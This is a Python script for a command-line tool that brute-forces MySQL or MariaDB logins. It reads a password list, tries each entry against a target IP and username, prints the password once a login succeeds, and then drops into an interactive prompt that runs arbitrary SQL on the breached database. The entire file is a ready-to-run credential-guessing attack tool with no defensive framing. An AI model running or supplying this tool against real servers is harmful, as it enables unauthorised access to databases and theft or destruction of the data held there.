import argparse
import mysql.connector
from mysql.connector import Error
from colorama import Fore, Style
import time

# Function to try connecting to MySQL/MariaDB
def try_connection(host, username, password, db_type):
    try:
        if db_type == 'mysql':
            connection = mysql.connector.connect(
                host=host,
                user=username,
                password=password,
            )
        elif db_type == 'mariadb':
            # MariaDB is compatible with MySQL, so we can use the same connection method.
            connection = mysql.connector.connect(
                host=host,
                user=username,
                password=password,
            )
        if connection.is_connected():
            print(Fore.GREEN + f"KEY FOUND: [\"{password}\"]" + Style.RESET_ALL)
            return True
    except Error as e:
        if "Access denied" in str(e):
            print(Fore.YELLOW + f"Trying Passphrase: \"{password}\"" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"Error connecting to {db_type} database: {e}" + Style.RESET_ALL)
    return False

# Function to execute SQL command once connected
def execute_command(connection):
    cursor = connection.cursor()
    while True:
        try:
            command = input("Enter SQL command to execute (or 'exit' to quit): ")
            if command.lower() == 'exit':
                break
            cursor.execute(command)
            results = cursor.fetchall()
            for row in results:
                print(row)
        except Exception as e:
            print(Fore.RED + f"Error executing command: {e}" + Style.RESET_ALL)

# Main brute force function
def brute_force(host, username, password_file, db_type):
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            if try_connection(host, username, password, db_type):
                # If password is found, allow executing commands
                connection = mysql.connector.connect(
                    host=host,
                    user=username,
                    password=password,
                )
                execute_command(connection)
                break
        else:
            print(Fore.RED + "KEY NOT FOUND" + Style.RESET_ALL)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Brute Forcer")
    parser.add_argument('-l', '--username', required=True, help="Username to brute force")
    parser.add_argument('-P', '--passwordlist', required=True, help="Path to password list")
    parser.add_argument('sql_url', help="Target database URL (format: sql://<target-ip>)")
    parser.add_argument('-t', '--type', choices=['mysql', 'mariadb'], required=True, help="Database type (mysql/mariadb)")
    
    args = parser.parse_args()
    
    # Extract target IP from sql://<target-ip>
    target_ip = args.sql_url.split("://")[1]
    
    print(Fore.CYAN + f"Brute-forcing {args.type} database at {target_ip} for user {args.username}..." + Style.RESET_ALL)
    
    brute_force(target_ip, args.username, args.passwordlist, args.type)
